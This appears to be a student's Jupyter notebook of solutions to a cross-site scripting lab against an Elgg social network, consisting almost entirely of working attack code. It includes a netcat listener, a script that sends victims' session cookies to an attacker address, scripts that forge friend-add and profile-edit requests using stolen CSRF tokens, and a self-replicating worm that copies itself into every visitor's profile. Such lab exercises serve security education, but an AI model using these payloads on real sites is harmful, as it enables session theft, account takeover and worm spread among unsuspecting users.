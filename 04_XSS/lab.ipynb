{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "http://localhost/ files"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "cd /var/www/html/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Task3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "nc -lknv 5555 #open port 5555"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "html"
    }
   },
   "outputs": [],
   "source": [
    "<script>\n",
    "    document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >');\n",
    "</script>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Task 4"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "html"
    }
   },
   "outputs": [],
   "source": [
    "<script type=\"text/javascript\">\n",
    "    window.onload = function () {\n",
    "        var Ajax=null;\n",
    "        var ts=\"&__elgg_ts=\"+elgg.security.token.__elgg_ts;\n",
    "        var token=\"&__elgg_token=\"+elgg.security.token.__elgg_token;\n",
    "\n",
    "        //Construct the HTTP request to add Samy as a friend.\n",
    "        var sendurl = \"/action/friends/add?friend=59\" + ts + token;\n",
    "\n",
    "        //Create and send Ajax request to add friend\n",
    "        Ajax=new XMLHttpRequest();\n",
    "        Ajax.open(\"GET\", sendurl, true);\n",
    "        Ajax.send();\n",
    "    }\n",
    "</script>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Task 5"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "html"
    }
   },
   "outputs": [],
   "source": [
    "<script type=\"text/javascript\">\n",
    "    window.onload = function() {\n",
    "        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts\n",
    "        //and Security Token __elgg_token\n",
    "        var userName=\"&name=\"+elgg.session.user.name;\n",
    "        var guid=\"&guid=\"+elgg.session.user.guid;\n",
    "        var ts=\"&__elgg_ts=\"+elgg.security.token.__elgg_ts;\n",
    "        var token=\"&__elgg_token=\"+elgg.security.token.__elgg_token;\n",
    "\n",
    "        //Construct the content of your url.\n",
    "        var content = \"description=<p>CIAO</p>\"\n",
    "                    + userName + guid + ts + token;\n",
    "\n",
    "        var samyGuid = 59; //FILL IN\n",
    "        var sendurl = \"/action/profile/edit\"; //FILL IN\n",
    "\n",
    "        if(elgg.session.user.guid != samyGuid) { // (1)\n",
    "        //Create and send Ajax request to modify profile\n",
    "            var Ajax=null;\n",
    "            Ajax=new XMLHttpRequest();\n",
    "            Ajax.open(\"POST\", sendurl, true);\n",
    "            Ajax.setRequestHeader(\"Content-Type\",\n",
    "            \"application/x-www-form-urlencoded\");\n",
    "            Ajax.send(content);\n",
    "        }\n",
    "    }\n",
    "</script>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Task6"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "javascript"
    }
   },
   "outputs": [],
   "source": [
    "//Link Approach (.js hosted in /var/www/html/)\n",
    "<script id=\"worm\" type=\"text/javascript\" src=\"http://localhost/task6.js\"></script>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "html"
    }
   },
   "outputs": [],
   "source": [
    "<script id=\"worm\" type=\"text/javascript\">\n",
    "    window.onload = function() {\n",
    "        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts\n",
    "        //and Security Token __elgg_token\n",
    "        var userName=\"&name=\"+elgg.session.user.name;\n",
    "        var guid=\"&guid=\"+elgg.session.user.guid;\n",
    "        var ts=\"&__elgg_ts=\"+elgg.security.token.__elgg_ts;\n",
    "        var token=\"&__elgg_token=\"+elgg.security.token.__elgg_token;\n",
    "        //Construct the content of your url.\n",
    "    \n",
    "        var samyGuid=59; //FILL IN\n",
    "        var sendurl=\"http://www.seed-server.com/action/profile/edit\"; //FILL IN\n",
    "        \n",
    "        var headerTag = \"<script id=\\\"worm\\\" type=\\\"text/javascript\\\">\"; // (1)\n",
    "        \n",
    "        var jsCode = document.getElementById(\"worm\").innerHTML;\n",
    "        var tailTag = \"</\" + \"script>\";\n",
    "        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); // (4)\n",
    "        \n",
    "        var content=\"description=\"+wormCode+userName+guid+ts+token; //FILL IN\n",
    "        \n",
    "        if(elgg.session.user.guid != samyGuid) {\n",
    "            //Create and send Ajax request to modify profile\n",
    "            var Ajax=null;\n",
    "            Ajax=new XMLHttpRequest();\n",
    "            Ajax.open(\"POST\", sendurl, true);\n",
    "            Ajax.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n",
    "            Ajax.send(content);\n",
    "            \n",
    "            var sendurl= \"http://www.seed-server.com/action/friends/add?friend=\" +samyGuid + \"&__elgg_ts=\" + ts+ \"&__elgg_token=\"+token ; //FILL IN\n",
    "            //Create and send Ajax request to add friend\n",
    "            Ajax=new XMLHttpRequest();\n",
    "            Ajax.open(\"GET\", sendurl, true);\n",
    "            Ajax.send();\n",
    "        }\n",
    "    }\n",
    "    </script>"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
